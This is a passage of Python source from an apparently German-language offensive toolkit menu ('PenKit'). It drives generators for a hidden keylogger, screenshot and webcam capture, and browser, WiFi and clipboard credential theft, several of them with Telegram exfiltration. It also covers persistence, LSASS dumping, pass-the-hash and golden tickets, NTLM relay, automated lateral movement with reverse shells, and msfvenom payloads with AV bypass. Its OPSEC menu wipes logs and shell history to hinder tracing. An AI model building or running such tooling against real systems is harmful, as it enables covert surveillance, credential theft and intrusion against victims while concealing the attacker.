            banner(); section("🔒  PERSISTENCE BUILDER", "Alle Persistence-Methoden")
            info_box([
                "4 Methoden, verschiedene Stealth-Level:",
                "  Registry Run Key — einfach, sichtbar in Autoruns",
                "  Scheduled Task   — echter Name, als SYSTEM",
                "  WMI Subscription — sehr versteckt, kein Run-Key",
                "  Startup-Ordner   — simpel, sichtbar im Explorer",
            ])
            print()
            payload_path = ask("Payload-Pfad auf Ziel", "C:\\Windows\\Temp\\update.exe")
            print()
            from tools.c2.post_exploit import show_persistence_options
            await run_tool_live(show_persistence_options(payload_path))

        elif choice == "5":
            banner(); section("📁  FILE EXFILTRATION", "Interessante Dateien finden + exfiltrieren")
            info_box([
                "Sucht nach:",
                "  → .kdbx (KeePass), .rdp, .ppk (SSH-Keys), .pfx (Zertifikate)",
                "  → .env, web.config, credentials.xml",
                "  → Passwort-Dateien in Desktop/Docs/Downloads",
                "",
                "Exfil-Methoden: HTTP POST, SMB Share, DNS-Tunnel",
            ])
            print()
            kali_ip = ask("Deine Kali IP", "10.10.10.1")
            try:
                port = int(ask("Port für Empfang", "4444"))
            except ValueError:
                port = 4444
            print()
            from tools.c2.post_exploit import generate_exfil_payloads
            await run_tool_live(generate_exfil_payloads(kali_ip, port))

        elif choice == "6":
            banner(); section("🪟  LOLBAS CHEATSHEET", "Windows Built-in Tools missbrauchen")
            print()
            filter_term = ask("Filter (leer = alle zeigen)", "")
            print()
            from tools.c2.post_exploit import show_lolbas
            await run_tool_live(show_lolbas(filter_term))

        elif choice == "7":
            banner(); section("📡  PYPYKATZ", "LSASS-Dump auf Kali analysieren")
            info_box([
                "pypykatz = Python-Mimikatz — analysiert LSASS.dmp auf Kali.",
                "Install: pip3 install pypykatz --break-system-packages",
                "",
                "Dump holen via:",
                "  Option 2 → PS1-Befehl auf Ziel ausführen",
                "  Dann: copy C:\\Windows\\Temp\\lsass.dmp \\\\<kali>\\share\\",
            ])
            print()
            dump_path = ask("Pfad zur .dmp Datei", required=True)
            if not dump_path:
                wait_key(); continue
            import os
            if not os.path.exists(dump_path):
                print(f"  {Y}[!] Datei nicht gefunden: {dump_path}{R}")
                wait_key(); continue
            print()
            from tools.c2.post_exploit import analyze_lsass_dump
            await run_tool_live(analyze_lsass_dump(dump_path))

        elif choice == "8":
            banner(); section("⌨️  KEYLOGGER", "Alle Tasten aufzeichnen — kein Tool-Upload nötig")
            info_box([
                "Standalone PowerShell Keylogger via SetWindowsHookEx (C# Add-Type).",
                "",
                "  → Läuft im Hintergrund als Job — kein sichtbares Fenster",
                "  → Braucht KEINEN Admin — läuft im normalen User-Kontext",
                "  → Speichert alle Tasten in eine Datei",
                "  → Optional: alle N Sekunden automatisch via Telegram senden",
                "",
                "Stoppen: Stop-Job / Remove-Job oder Datei manuell lesen",
                "Auf Kali exfiltrieren: Option 5 → File Exfiltration",
            ])
            print()
            log_path = ask("Log-Datei auf Ziel", "C:\\Windows\\Temp\\kl.txt")
            use_tg = ask("Telegram-Versand? [j/n]", "n")
            tg_token, tg_chat, send_interval = "", "", 300
            if use_tg.lower() == "j":
                tg_token = ask("Bot-Token")
                tg_chat  = ask("Chat-ID")
                try:
                    send_interval = int(ask("Sende-Intervall in Sekunden", "300"))
                except ValueError:
                    send_interval = 300
            print()
            from tools.c2.post_exploit import keylogger_ps1, keylogger_stop_ps1
            ps1 = keylogger_ps1(log_path, tg_token, tg_chat, send_interval)
            print(f"  {G}[+] Keylogger PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1}{R}")
            print(f"\n  {Y}[→] Log lesen/löschen:{R}")
            print(f"  {C}{keylogger_stop_ps1(log_path)}{R}")

        elif choice == "9":
            banner(); section("📸  SCREENSHOT", "Vollbild-Screenshot — kein Tool-Upload")
            info_box([
                "Screenshot via System.Windows.Forms.Screen (Windows built-in).",
                "",
                "  → Kein Tool-Upload, kein Admin nötig",
                "  → Speichert als PNG in angegebenen Pfad",
                "  → Optional: Bild direkt als Telegram-Foto senden",
                "",
                "Auf Kali holen: Option 5 → File Exfiltration",
            ])
            print()
            save_path = ask("Speicherpfad auf Ziel", "C:\\Windows\\Temp\\sc.png")
            use_tg = ask("Direkt via Telegram senden? [j/n]", "n")
            tg_token, tg_chat = "", ""
            if use_tg.lower() == "j":
                tg_token = ask("Bot-Token")
                tg_chat  = ask("Chat-ID")
            print()
            from tools.c2.post_exploit import screenshot_ps1
            ps1 = screenshot_ps1(save_path, tg_token, tg_chat)
            print(f"  {G}[+] Screenshot PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1}{R}")

        elif choice == "w":
            banner(); section("📷  WEBCAM SNAPSHOT", "Kamera-Foto via WIA COM — kein Tool-Upload")
            info_box([
                "Webcam-Foto via Windows Image Acquisition (WIA) COM-Objekt.",
                "",
                "  → Kein Tool-Upload, keine extra Software",
                "  → Fallback: ffmpeg (wenn installiert) oder DirectShow",
                "  → Kamera-LED leuchtet kurz auf (WIA-Limitation)",
                "  → Optional: Foto direkt an Telegram senden",
                "",
                "Tipp: Vorher mit Screenshot testen ob jemand am PC ist.",
            ])
            print()
            save_path = ask("Speicherpfad auf Ziel", "C:\\Windows\\Temp\\cam.jpg")
            use_tg = ask("Direkt via Telegram senden? [j/n]", "n")
            tg_token, tg_chat = "", ""
            if use_tg.lower() == "j":
                tg_token = ask("Bot-Token")
                tg_chat  = ask("Chat-ID")
            print()
            from tools.c2.post_exploit import webcam_ps1
            ps1 = webcam_ps1(save_path, tg_token, tg_chat)
            print(f"  {G}[+] Webcam PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1}{R}")

        elif choice == "b":
            banner(); section("🌐  BROWSER PASSWÖRTER", "Chrome · Edge · Firefox via DPAPI")
            info_box([
                "Dumpt gespeicherte Passwörter aus allen gängigen Browsern.",
                "",
                "  Chrome / Edge / Brave → DPAPI (user-spezifisch, kein Admin)",
                "  Firefox → logins.json (base64, key4.db für Klartext)",
                "  Windows Credential Manager → cmdkey /list",
                "",
                "Hinweis: Chrome v80+ nutzt AES-GCM mit Master Key.",
                "  Für Klartext-Extraktion: Telegram-Agent !browsers nutzen",
                "  (Agent hat direkten Zugriff auf DPAPI + AES-Key im laufenden Chrome)",
            ])
            print()
            save_path = ask("Ausgabe-Datei auf Ziel", "C:\\Windows\\Temp\\bpw.txt")
            print()
            from tools.c2.post_exploit import browser_passwords_ps1
            ps1 = browser_passwords_ps1(save_path)
            print(f"  {G}[+] Browser-Password PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1[:600]}...{R}")
            print(f"\n  {DIM}[vollständiges Script — zum Kopieren: Scroll Up]{R}")
            print(f"\n  {Y}Tipp für Chrome AES-GCM: Telegram-Agent C2 → !browsers{R}")

        elif choice == "i":
            banner(); section("📶  WIFI PASSWÖRTER", "Alle gespeicherten WLAN-Keys")
            info_box([
                "Dumpt alle gespeicherten WLAN-Passwörter via netsh wlan.",
                "",
                "  → Kein Admin nötig für eigene Profile",
                "  → Als Admin: ALLE Benutzer-Profile sichtbar",
                "  → Zeigt: SSID, Auth-Methode, Klartext-Passwort",
                "",
                "Nützlich für: laterale Bewegung ins gleiche WLAN,",
                "  oder als gefundene Credentials im Bericht.",
            ])
            print()
            save_path = ask("Ausgabe-Datei auf Ziel", "C:\\Windows\\Temp\\wifi.txt")
            print()
            from tools.c2.post_exploit import wifi_passwords_ps1
            ps1 = wifi_passwords_ps1(save_path)
            print(f"  {G}[+] WiFi Password PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1}{R}")

        elif choice == "c":
            banner(); section("📋  CLIPBOARD MONITOR", "Zwischenablage überwachen")
            info_box([
                "Überwacht die Windows-Zwischenablage in Echtzeit.",
                "",
                "  → Fängt: Passwörter, API-Keys, Tokens, Krypto-Wallets,",
                "           Kreditkartennummern, URLs, SSH-Keys",
                "  → Markiert automatisch 'interessante' Inhalte in Rot",
                "  → Optional: interessante Inhalte sofort an Telegram senden",
                "  → Läuft für N Sekunden, dann automatisch Stop + Speichern",
            ])
            print()
            try:
                duration = int(ask("Dauer in Sekunden", "600"))
            except ValueError:
                duration = 600
            save_path = ask("Log-Datei auf Ziel", "C:\\Windows\\Temp\\clip.txt")
            use_tg = ask("Interessante Inhalte via Telegram? [j/n]", "n")
            tg_token, tg_chat = "", ""
            if use_tg.lower() == "j":
                tg_token = ask("Bot-Token")
                tg_chat  = ask("Chat-ID")
            print()
            from tools.c2.post_exploit import clipboard_monitor_ps1
            ps1 = clipboard_monitor_ps1(save_path, duration, tg_token, tg_chat)
            print(f"  {G}[+] Clipboard-Monitor PS1 — auf Ziel ausführen:{R}\n")
            print(f"  {C}{ps1}{R}")

        elif choice == "a":
            banner(); section("🔍  AUTO-PRIVESC SCANNER", "15+ Vektoren — fertige Exploit-Befehle")
            info_box([
                "Generiert ein PS1-Script das auf dem Ziel-Windows läuft und prüft:",
                "",
                "  AlwaysInstallElevated · Unquoted Service Paths",
                "  Weak Service Permissions · Weak Registry Permissions",
                "  Writeable PATH Dirs (DLL Hijacking) · UAC Level",
                "  SeImpersonatePrivilege (Potato) · SeBackupPrivilege",
                "  SeDebugPrivilege · PrintNightmare · Scheduled Tasks",
                "  AutoRuns · Stored Credentials · WSL Escape",
                "",
                "Für jeden gefundenen Vektor: fertiger Exploit-Befehl direkt angezeigt.",
            ])
            print()
            report_path = ask("Report-Datei auf Ziel", "C:\\Windows\\Temp\\privesc.txt")
            kali_ip = ask("Kali IP (für Hinweise, optional)", "")
            print()
            print(f"  {Y}[→] Quick-Check (sofort, One-Liner):{R}")
            from tools.c2.privesc_scanner import generate_scanner_ps1, quick_check_ps1
            print(f"  {C}{quick_check_ps1()}{R}")
            print()
            show_full = ask("Vollständigen Scanner anzeigen? [j/n]", "j")
            if show_full.lower() == "j":
                print(f"\n  {G}[+] Vollständiger Auto-PrivEsc Scanner PS1:{R}\n")
                ps1 = generate_scanner_ps1(kali_ip, report_path)
                # Ausgabe in Blöcken damit Terminal nicht überläuft
                lines = ps1.split("\n")
                for line in lines:
                    print(f"  {C}{line}{R}")
            print(f"\n  {DIM}Tipp: Skript in PowerShell ISE einfügen und mit F5 starten.{R}")
            print(f"  {DIM}Oder als Datei: 'skript.ps1' → powershell -ep bypass ./skript.ps1{R}")

        wait_key()


async def menu_report():
    """HTML-Report aus allen Scan-Ergebnissen generieren."""
    banner()
    section("📊  HTML REPORT GENERATOR", "Alle Scans → professioneller Report")
    info_box([
        "Liest alle Dateien aus ~/penkit-output/ und erstellt:",
        "  → Dashboard mit CVEs, Credentials, Payloads, WiFi-Captures",
        "  → Farbcodiert nach Kritikalität (Critical → Low)",
        "  → Sortierte CVE-Tabelle mit Metasploit-Modulen",
        "  → Credentials-Tabelle",
        "  → Standalone HTML — kein Internet nötig",
        "",
        "Tipp: firefox ~/penkit-output/report_*.html öffnen",
    ])
    print()
    title = ask("Report-Titel", "PenKit Pentest Report")
    print()
    from core.report_gen import generate_report
    try:
        await run_tool_live(generate_report(title))
    except Exception as e:
        print(f"  {RD}[!] {e}{R}")
    wait_key()


async def menu_output():
    """Output-Verzeichnis — zeigt alle gespeicherten Dateien."""
    from core.output_dir import summary, ROOT, DIRS, list_files
    banner()
    section("📁  PENKIT OUTPUT-VERZEICHNIS", f"~/penkit-output/ — alle gespeicherten Dateien")
    print()
    print(f"  {summary()}")
    print()
    print(f"  {C}Kategorien:{R}")
    cats = list(DIRS.keys())
    for i, name in enumerate(cats, 1):
        files = list_files(name)
        if files:
            print(f"  {DIM}[{i}]{R}  {G}{name:<12}{R}  {DIM}{len(files)} Datei(en) — neueste: {files[0].name}{R}")
        else:
            print(f"  {DIM}[{i}]{R}  {DIM}{name:<12}  (leer){R}")

    print()
    choice = ask("Kategorie öffnen (1-10, leer=zurück)", "")
    if choice.isdigit() and 1 <= int(choice) <= len(cats):
        cat = cats[int(choice)-1]
        files = list_files(cat)
        clr()
        section(f"📂  {cat.upper()}", str(DIRS[cat]))
        if not files:
            print(f"  {Y}[!] Keine Dateien.{R}")
        else:
            for i, f in enumerate(files[:30], 1):
                size = f.stat().st_size // 1024 if f.is_file() else 0
                print(f"  {DIM}{i:>2}.{R}  {G}{f.name:<50}{R}  {DIM}{size} KB{R}")
        print()
        print(f"  {DIM}Öffnen: xdg-open {DIRS[cat]}{R}")
        print(f"  {DIM}Löschen: rm -rf {DIRS[cat]}/*{R}")
    wait_key()


async def menu_anon():
    """Anonymitäts & OPSEC Manager."""
    while True:
        banner()
        from core.anon import anon_status
        from core.opsec import opsec_score, killswitch_status
        import subprocess as _sp

        s      = anon_status()
        ks     = killswitch_status()
        score, warnings = opsec_score()
        hn     = _sp.run(["hostname"], capture_output=True, text=True).stdout.strip()

        # Score-Farbe
        sc = G if score >= 80 else (Y if score >= 50 else RD)
        ks_badge  = f"{G}AKTIV ✓{R}"   if ks          else f"{RD}INAKTIV ✗{R}"
        tor_badge = f"{G}AKTIV ✓{R}"   if s["tor"]    else f"{RD}INAKTIV ✗{R}"
        pc_badge  = f"{G}✓{R}"         if s["proxychains"] else f"{RD}✗{R}"

        section("🧅  ANONYMITÄT & OPSEC", "Tor · Kill Switch · MAC · Hostname · Logs · Wipe")
        print(f"  OPSEC-Score:    {sc}{B}{score}/100{R}")
        print(f"  Tor:            {tor_badge}")
        print(f"  Kill Switch:    {ks_badge}")
        print(f"  proxychains4:   {pc_badge}")
        print(f"  Hostname:       {DIM}{hn}{R}")
        if warnings:
            print()
            for w in warnings:
                print(f"  {RD}[!]{R} {w}")
        print()

        menu_item("1", "🧅  Tor starten",               "🟢", "Traffic über Tor anonymisieren")
        menu_item("2", "🔄  Neue Tor-Identity",          "🟢", "Neue Exit-IP anfordern")
        menu_item("3", "⛔  Tor stoppen",                "🟡", "Direktverbindung reaktivieren")
        menu_item("4", "🔍  IP & DNS Leak Check",        "🟢", "Echte IP vs Tor-Exit-IP")
        menu_item("5", "⚙️   proxychains konfigurieren",  "🟢", "Sicherstellen dass proxychains → Tor")
        menu_item("6", "🔒  Kill Switch AKTIVIEREN",     "🔴", "Blockiert alles außer Tor — kein IP-Leak")
        menu_item("7", "🔓  Kill Switch deaktivieren",   "🟡", "Normaler Traffic wieder erlaubt")
        menu_item("8", "🎭  MAC-Adresse spoofing",       "🟠", "Hardware-ID ändern (alle Interfaces)")
        menu_item("9", "💻  Hostname ändern",            "🟠", "Gerätename in Netzwerkscans verschleiern")
        menu_item("L", "🗑️   Logs & History löschen",    "🟡", "System-Logs + Shell-History leeren")
        menu_item("W", "💣  Session Wipe",               "🔴", "Alle Captures, Keys, Temp-Dateien löschen")
        menu_item("0", "Back")
        print()
        print(f"  {DIM}Für maximalen Schutz:{R}  {C}proxychains4 python3 classic_menu.py{R}")
        print()

        choice = prompt("opsec")
        if choice == "0":
            return
        clr()

        if choice == "1":
            from core.anon import start_tor
            await run_tool_live(start_tor())

        elif choice == "2":
            from core.anon import restart_tor
            await run_tool_live(restart_tor())

        elif choice == "3":
            from core.anon import stop_tor
            await run_tool_live(stop_tor())

        elif choice == "4":
            from core.anon import ip_leak_check
            await run_tool_live(ip_leak_check())

        elif choice == "5":
            from core.anon import setup_proxychains
            await run_tool_live(setup_proxychains())

        elif choice == "6":
            from core.opsec import killswitch_enable
            await run_tool_live(killswitch_enable())

        elif choice == "7":
            from core.opsec import killswitch_disable
            await run_tool_live(killswitch_disable())

        elif choice == "8":
            from core.opsec import mac_spoof_all
            section("MAC SPOOFING", "Alle Interfaces — Hardware-ID randomisieren")
            info_box([
                "Ändert die MAC-Adresse aller Netzwerk-Interfaces.",
                "Verhindert Rückverfolgung in Netzwerk-Logs.",
                "",
                "Empfohlen: vor jedem WiFi-Angriff ausführen.",
                "Zurücksetzen: Option 8 nochmals → 'r' eingeben",
            ])
            print()
            restore = ask("Zurücksetzen auf Original-MAC? [j/n]", "n")
            if restore.lower() == "j":
                from core.opsec import mac_spoof, _interfaces
                for iface in _interfaces():
                    await run_tool_live(mac_spoof(iface, restore=True))
            else:
                await run_tool_live(mac_spoof_all())

        elif choice == "9":
            from core.opsec import hostname_change, hostname_restore, FAKE_HOSTNAMES
            section("HOSTNAME ÄNDERN", "Gerätename in Netzwerkscans verschleiern")
            info_box([
                "Dein Hostname erscheint in Netzwerkscans (nmap, SMB, LLMNR).",
                "Zufälliger Windows-ähnlicher Name macht Rückverfolgung schwerer.",
                "",
                f"Beispiele: {', '.join(FAKE_HOSTNAMES[:4])}...",
            ])
            print()
            custom = ask("Eigener Name (Enter = zufällig)", "")
            restore = ask("Zurück zu 'kali'? [j/n]", "n")
            if restore.lower() == "j":
                await run_tool_live(hostname_restore())
            else:
                await run_tool_live(hostname_change(custom))

        elif choice in ("l", "L"):
            from core.opsec import clean_logs, clean_history
            section("LOGS & HISTORY LÖSCHEN", "System-Logs + Shell-History leeren")
            info_box([
                "Löscht:",
                "  → /var/log/auth.log, syslog, kern.log, wtmp, btmp",
                "  → ~/.bash_history, ~/.zsh_history",
                "  → Zuletzt geöffnete Dateien",
                "",
                "Empfohlen: nach jeder Session ausführen.",
            ])
            print()
            await run_tool_live(clean_logs())
            print()
            await run_tool_live(clean_history())

        elif choice in ("w", "W"):
            from core.opsec import session_wipe
            section("SESSION WIPE", "Alle temporären Dateien sicher löschen")
            info_box([
                "Löscht sicher:",
                "  → Alle .pcap / .cap / .hccapx Captures",
                "  → Temporäre Keys (.pem, .key)",
                "  → /tmp PenKit-Dateien",
                "  → Browser-Cache",
                "",
                "Optional: auch ~/penkit-output/ komplett löschen",
            ])
            print()
            wipe_out = ask("Auch ~/penkit-output/ löschen? [j/n]", "n")
            await run_tool_live(session_wipe(wipe_out.lower() == "j"))

        wait_key()


async def menu_lateral():
    """Lateral Movement Wizard — PTH, NTLM Relay, Pivot, Auto-Chain."""
    while True:
        banner()
        section("🔀  LATERAL MOVEMENT", "PTH · PTT · SMBExec · WMIExec · NTLM Relay · Pivot · Auto-Chain")
        print(f"  {RD}{B}⛔  NUR auf autorisierten Netzwerken!{R}\n")
        menu_item(" 1", "🔑  Pass-the-Hash Wizard",        "⛔", "NTLM Hash → Shell ohne Passwort (alle Methoden)")
        menu_item(" 2", "🎫  Pass-the-Ticket (Kerberos)",  "⛔", "Ticket inject / Golden Ticket / AS-REP Roast")
        menu_item(" 3", "📡  NTLM Relay Wizard",           "⛔", "Responder + ntlmrelayx + Coercion + mitm6")
        menu_item(" 4", "🖥️   DCOM Remote Exec",            "🔴", "Shell via DCOM (kein Service, lautlos)")
        menu_item(" 5", "🌐  Network Pivot Setup",         "🔴", "sshuttle / SOCKS / ligolo-ng / chisel")
        menu_item(" 6", "🔗  Auto-Lateral Chain",          "⛔", "spray → PTH → Dump → Repeat (vollautomatisch)")
        menu_item(" 0", "← Zurück", "")
        print()

        choice = prompt("lateral")
        if choice == "0":
            return
        clr()

        if choice == "1":
            banner(); section("🔑  PASS-THE-HASH WIZARD", "NTLM Hash direkt nutzen — kein Passwort-Cracking")
            info_box([
                "Pass-the-Hash = NTLM Hash direkt für Auth nutzen.",
                "Kein Passwort-Cracking nötig — Hash ist genug!",
                "",
                "Hash holen via: LSASS Dump (Post-Exploit →2), secretsdump, pypykatz",
                "Format: NTLM Hash = 32 Hex-Zeichen, z.B. 8846f7eaee8fb117ad06bdd830b7586c",
                "",
                "Dann: shell, hashdump, weitere Hashes, lateral movement",
            ])
            print()
            target   = ask("Ziel-IP", required=True)
            if not target: wait_key(); continue
            domain   = ask("Domain (oder Workgroup / WORKGROUP)", "WORKGROUP")
            username = ask("Benutzername", "Administrator")
            nt_hash  = ask("NTLM Hash (32 Hex-Zeichen)", required=True)
            if not nt_hash: wait_key(); continue
            kali_ip  = ask("Kali IP", "10.10.10.1")
            print()
            from tools.network.lateral_movement import pth_wizard
            await run_tool_live(pth_wizard(target, domain, username, nt_hash, kali_ip))

        elif choice == "2":
            banner(); section("🎫  PASS-THE-TICKET", "Kerberos Tickets · Golden Ticket · Kerberoast")
            info_box([
                "Pass-the-Ticket = Kerberos Ticket direkt injizieren.",
                "",
                "Drei Wege:",
                "  a) Ticket aus LSASS extrahieren (Rubeus) → injizieren",
                "  b) Kerberoast → Hash cracken → Passwort",
                "  c) Golden Ticket (krbtgt Hash) → unbegrenzte Domäne",
                "",
                "Golden Ticket braucht: krbtgt NTLM Hash + Domain SID",
                "  → Holen via DCSync (AD-Menü → DCSync)",
            ])
            print()
            target    = ask("Ziel-IP / DC", required=True)
            if not target: wait_key(); continue
            domain    = ask("Domain (z.B. corp.local)", required=True)
            if not domain: wait_key(); continue
            username  = ask("Benutzername", "Administrator")
            krbtgt    = ask("krbtgt NTLM Hash (für Golden Ticket, leer lassen wenn unbekannt)", "")
            ticket    = ask("Ticket-Datei (.ccache / .kirbi, leer lassen wenn keins)", "")
            dc_ip     = ask("DC IP", target)
            print()
            from tools.network.lateral_movement import ptt_commands
            cmds = ptt_commands(target, domain, username, krbtgt, ticket, dc_ip)
            for method, cmd in cmds.items():
                print(f"  {Y}[→] {method}:{R}")
                print(f"  {C}{cmd}{R}\n")

        elif choice == "3":
            banner(); section("📡  NTLM RELAY WIZARD", "Responder + ntlmrelayx + Coercion")
            info_box([
                "NTLM Relay = abgefangene NTLM-Auth wird an Ziel weitergeleitet.",
                "",
                "Ablauf:",
                "  1. Responder vergiftet LLMNR/NBT-NS → Clients schicken Auth",
                "  2. ntlmrelayx leitet Auth weiter → Shell oder Hash oder DCSync",
                "  3. Optional: Coercion (PetitPotam/PrinterBug) erzwingt Auth sofort",
                "",
                "Wichtig: Responder.conf → SMB=Off, HTTP=Off wenn ntlmrelayx läuft!",
            ])
            print()
            interface    = ask("Netzwerk-Interface", "eth0")
            target       = ask("Relay-Ziel IP", required=True)
            if not target: wait_key(); continue
            relay_target = ask("Weiterleitungs-Ziel IP (leer = gleich wie Ziel)", "")
            print()
            from tools.network.lateral_movement import show_ntlm_relay_wizard
            await run_tool_live(show_ntlm_relay_wizard(interface, target, relay_target))

        elif choice == "4":
            banner(); section("🖥️  DCOM REMOTE EXEC", "Shell via DCOM — kein Service-Install, kein SMB-Login-Event")
            info_box([
                "DCOM = Distributed COM — Windows-Bordmittel für Remote-Ausführung.",
                "Vorteil: kein Service-Install (PSExec), kein SMB Auth-Log.",
                "Braucht: Admin-Credentials (Passwort oder Hash).",
                "",
                "Drei DCOM-Objekte: MMC20, ShellWindows, ShellBrowserWindow",
            ])
            print()
            target   = ask("Ziel-IP", required=True)
            if not target: wait_key(); continue
            domain   = ask("Domain / WORKGROUP", "WORKGROUP")
            username = ask("Benutzername", "Administrator")
            password = ask("Passwort (oder NTLM Hash für PTH)")
            print()
            from tools.network.lateral_movement import dcom_exec_commands
            cmds = dcom_exec_commands(target, domain, username, password)
            for method, cmd in cmds.items():
                print(f"  {Y}[→] {method}:{R}")
                print(f"  {C}{cmd}{R}\n")

        elif choice == "5":
            banner(); section("🌐  NETWORK PIVOT SETUP", "sshuttle · SOCKS · ligolo-ng · chisel")
            info_box([
                "Pivot = vom kompromittierten Host aus ins interne Netz angreifen.",
                "",
                "sshuttle = transparenter Proxy, empfohlen wenn SSH vorhanden.",
                "SOCKS + proxychains = Standard, für einzelne Tools.",
                "ligolo-ng = moderner, schneller Tunnel, empfohlen für große Netze.",
                "chisel = wenn kein SSH vorhanden.",
            ])
            print()
            pivot_ip   = ask("IP des kompromittierten Hosts (Pivot)", required=True)
            if not pivot_ip: wait_key(); continue
            pivot_user = ask("SSH-User auf Pivot", "root")
            ssh_key    = ask("SSH Key-Datei (leer = Passwort-Auth)", "")
            subnet     = ask("Ziel-Subnetz", "192.168.1.0/24")
            print()
            from tools.network.lateral_movement import pivot_setup
            setups = pivot_setup(pivot_ip, pivot_user, ssh_key, subnet)
            for method, cmd in setups.items():
                print(f"  {Y}[→] {method}:{R}")
                for line in cmd.split("\n"):
                    style = DIM if line.strip().startswith("#") else C
                    print(f"  {style}{line}{R}")
                print()

        elif choice == "6":
            banner(); section("🔗  AUTO-LATERAL CHAIN", "spray → PTH → Dump → Repeat")
            info_box([
                "Vollautomatische Lateral Movement Sequenz:",
                "  Phase 1: SMB-Erreichbarkeit + PTH prüfen (alle Ziele)",
                "  Phase 2: Hashes von erreichbaren Zielen dumpen (SAM)",
                "  Phase 3: Reverse Shell auf alle erreichbaren Ziele",
                "  Phase 4: Secretsdump (alle Credentials)",
                "  Phase 5: BloodHound-Daten sammeln → Weg zum DA",
                "",
                "Ergebnis: vollständige Credentials-Map + Angriffspfade",
            ])
            print()
            raw_targets = ask("Ziel-IPs (komma-getrennt oder CIDR)", required=True)
            if not raw_targets: wait_key(); continue
            targets = [t.strip() for t in raw_targets.replace(",", " ").split() if t.strip()]
            domain   = ask("Domain / WORKGROUP", "WORKGROUP")
            username = ask("Benutzername", "Administrator")
            nt_hash  = ask("NTLM Hash", required=True)
            if not nt_hash: wait_key(); continue
            kali_ip  = ask("Kali IP", "10.10.10.1")
            try:
                lport = int(ask("Listener-Port", "4444"))
            except ValueError:
                lport = 4444
            print()
            from tools.network.lateral_movement import auto_lateral_chain
            await run_tool_live(auto_lateral_chain(targets, domain, username, nt_hash, kali_ip, lport))

        wait_key()


async def menu_msf():
    """Metasploit Framework — vollständiger MSF-Workflow."""
    while True:
        banner()
        section("💣  METASPLOIT FRAMEWORK", "Payloads · Handler · Top-Exploits · Post-Modules · RC-Scripts")
        print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen!{R}\n")
        menu_item(" 1", "🧬  msfvenom Payload Builder",    "⛔", "Windows/Linux/Web/Android — alle Formate")
        menu_item(" 2", "📡  Multi/Handler starten",       "🔴", "Empfängt Meterpreter/Shells — fertige Befehle")
        menu_item(" 3", "💥  Top Exploit Module",          "⛔", "EternalBlue, BlueKeep, PrintNightmare, Log4Shell...")
        menu_item(" 4", "🔧  Post-Exploitation Module",    "🔴", "getsystem, hashdump, kiwi, autoroute, creds")
        menu_item(" 5", "📜  Resource Script Generator",  "⛔", "Vollautomatisch: Exploit → Shell → Post-Exploit")
        menu_item(" 6", "🗄️   MSF Datenbank Setup",         "🟡", "postgresql + msfdb init")
        menu_item(" 0", "← Zurück", "")
        print()

        choice = prompt("msf")
        if choice == "0":
            return
        clr()

        if choice == "1":
            banner(); section("🧬  MSFVENOM PAYLOAD BUILDER", "Windows · Linux · Web · Android · macOS")
            info_box([
                "msfvenom generiert Payloads die sich zurück zum Listener verbinden.",
                "",
                "LHOST = deine Kali IP (wo der Listener läuft)",
                "LPORT = Port des Listeners (443 empfohlen — sieht wie HTTPS aus)",
                "",
                "AV-Bypass Methoden:",
                "  shikata = x86 polymorphic encoder (mehrfach enkodieren)",
                "  xor     = XOR dynamic encoder (x64)",
                "  template= echte EXE als Wrapper nutzen (Icon + Signatur bleiben)",
            ])
            print()
            lhost = ask("LHOST — deine Kali IP", required=True)
            if not lhost: wait_key(); continue
            try:
                lport = int(ask("LPORT", "443"))
            except ValueError:
                lport = 443

            print()
            print(f"  {Y}Payload-Typ:{R}")
            print(f"  {C}[1]{R} Windows EXE         {C}[2]{R} Windows PowerShell")
            print(f"  {C}[3]{R} Windows HTA          {C}[4]{R} Windows Office Macro")
            print(f"  {C}[5]{R} Windows DLL          {C}[6]{R} Windows ASPX Webshell")
            print(f"  {C}[7]{R} Linux ELF            {C}[8]{R} Linux Bash")
            print(f"  {C}[9]{R} Android APK          {C}[A]{R} Alle anzeigen")
            print()
            pt_map = {
                "1": "windows_exe", "2": "windows_ps1", "3": "windows_hta",
                "4": "windows_vba", "5": "windows_dll", "6": "windows_aspx",
                "7": "linux_elf",   "8": "linux_bash",  "9": "android_apk",
            }
            sub = prompt("payload-typ")
            print()
            from tools.network.msf_integration import msfvenom_cmd, generate_payload_menu, PAYLOAD_FORMATS

            if sub.lower() == "a" or sub not in pt_map:
                await run_tool_live(generate_payload_menu(lhost, lport))
            else:
                pt = pt_map[sub]
                av = ask("AV-Bypass [none / shikata / xor / template]", "none")
                out = ask("Output-Dateiname", f"payload.{PAYLOAD_FORMATS[pt][1]}")
                cmd = msfvenom_cmd(lhost, lport, pt, out, av)
                print(f"\n  {G}[+] Befehl:{R}\n")
                print(f"  {C}{cmd}{R}\n")
                print(f"  {DIM}Handler danach starten: Option 2 in diesem Menü{R}")

        elif choice == "2":
            banner(); section("📡  MULTI/HANDLER", "Empfängt eingehende Meterpreter/Shell-Verbindungen")
            info_box([
                "Multi/Handler wartet auf eingehende Verbindungen vom Payload.",
                "",
                "LHOST + LPORT = gleich wie beim generierten Payload!",
                "",
                "Meterpreter = vollständige Session mit allen Post-Exploit-Modulen.",
                "Nach Verbindung: 'help' für alle Befehle, 'getsystem' für SYSTEM.",
            ])
            print()
            lhost = ask("LHOST — deine Kali IP", required=True)
            if not lhost: wait_key(); continue
            try:
                lport = int(ask("LPORT", "443"))
            except ValueError:
                lport = 443

            print()
            print(f"  {Y}Payload-Typ:{R}")
            print(f"  {C}[1]{R} windows/x64/meterpreter/reverse_tcp   (Standard)")
            print(f"  {C}[2]{R} windows/x64/meterpreter/reverse_https  (HTTPS, AV-bypass)")
            print(f"  {C}[3]{R} linux/x64/meterpreter/reverse_tcp")
            print(f"  {C}[4]{R} java/meterpreter/reverse_tcp")
            print()
            payload_map = {
                "1": "windows/x64/meterpreter/reverse_tcp",
                "2": "windows/x64/meterpreter/reverse_https",
                "3": "linux/x64/meterpreter/reverse_tcp",
                "4": "java/meterpreter/reverse_tcp",
            }
            sub = prompt("payload")
            payload = payload_map.get(sub, "windows/x64/meterpreter/reverse_tcp")
            print()
            from tools.network.msf_integration import handler_cmd, handler_rc_file
            cmd = handler_cmd(lhost, lport, payload)
            rc_content, rc_start = handler_rc_file(lhost, lport, payload)
            print(f"  {G}[+] Handler starten (Einzeiler):{R}\n")
